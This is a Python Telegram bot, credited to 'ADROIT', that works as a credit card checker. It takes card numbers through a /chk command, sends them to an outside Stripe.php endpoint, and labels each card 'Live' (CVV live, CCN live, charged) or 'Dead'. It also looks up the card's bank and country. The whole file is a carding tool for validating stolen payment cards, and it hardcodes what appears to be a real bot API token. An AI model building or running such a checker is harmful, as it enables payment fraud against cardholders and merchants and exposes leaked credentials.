from aiogram import Bot, Dispatcher, types
import requests
import aiohttp
import asyncio
from aiogram import executor

API_TOKEN = '6128115946:AAFFfctmVFWbJlJUA9nBVnzcgC_XjrOI36Y'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

rate_limit_data = {}
rate_limit_seconds = 30

async def cleanup_rate_limit_data():
    while True:
        for user_id in list(rate_limit_data):
            if asyncio.get_event_loop().time() - rate_limit_data[user_id] > rate_limit_seconds:
                del rate_limit_data[user_id]
        await asyncio.sleep(5)  # Check every 5 seconds

async def on_startup(dp):
    asyncio.create_task(cleanup_rate_limit_data())

async def check_cc(card_info: str) -> str:
    response = requests.get(f'https://dev-joker834.pantheonsite.io/Api/Stripe.php?lista={card_info}')
    if "insufficient funds" in response.text:
        return "Live 🟢 (CVV LIVE)"
    elif "security code is incorrect" in response.text or "ZIP INCORRECT" in response.text:
        return "Live 🟢 (CCN LIVE)"
    elif "Payment Completed" in response.text:
        return "Live 🟢 (CHARGE)"
    else:
        return "Dead 💀 (DECLINED ❌)"

@dp.message_handler(commands=['chk'])
async def check_cmd_handler(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username

    if user_id != 1219448009 and user_id in rate_limit_data:
        seconds_left = int(rate_limit_seconds - (asyncio.get_event_loop().time() - rate_limit_data[user_id]))
        await message.reply(f"Anti-spam: please try again after {seconds_left} seconds.")
        return

    rate_limit_data[user_id] = asyncio.get_event_loop().time()

    card_info = message.get_args()
    if not card_info:
        await message.reply("No CC found in input. Please input valid CC!")
        return

    in_progress_message = await message.reply("Checking, please wait...☕")

    result = await check_cc(card_info)

    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://lookup.binlist.net/{card_info.split("|")[0]}') as resp:
            if resp.status == 200:
                data = await resp.json()
                type = data.get("type", "N/A")
                brand = data.get("brand", "N/A")
                bank = data.get("bank", {}).get("name", "N/A")
                country = data.get("country", {}).get("name", "N/A")

    await bot.delete_message(in_progress_message.chat.id, in_progress_message.message_id)

    response_message = f"""
    ↯ CHECKED ✅

⊗ Card - {card_info}
⊗ Status - {result}
⊗ GATEWAY- Stripe
    
[ BIN INFO ]
⚆ Type - {type}
⚆ Brand - {brand}
⚆ Bank - {bank}
⚆ Country - {country}
                
 －－－－－－－－－－－－－－－－
                [ CHECK INFO ]
                
⌧ Proxy  - Live! 🌐 
⌧ Checked by:  @{message.from_user.username} 
⌧ Bot by -  ADROIT
    """
    await message.reply(response_message)

if __name__ == '__main__':
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)
  
